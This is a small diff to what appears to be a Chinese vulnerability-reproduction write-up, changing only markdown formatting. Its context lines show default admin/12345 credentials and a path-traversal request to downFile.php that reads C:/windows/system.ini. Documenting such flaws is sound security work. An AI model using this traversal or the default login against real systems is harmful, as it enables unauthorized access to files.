@@ -14,7 +14,7 @@
 
 ## 漏洞复现
 
-登录页面如下， 默认账号密码为 **admin/12345**
+登录页面如下， 默认账号密码为 `admin/12345`
 
 
 
@@ -36,4 +36,4 @@ http://xxx.xxx.xxx.xxx/systemLog/downFile.php?fileName=../../../../../../../../.
 
 
 
-成功读取 **C:/windows/system.ini**
+成功读取 `C:/windows/system.ini`
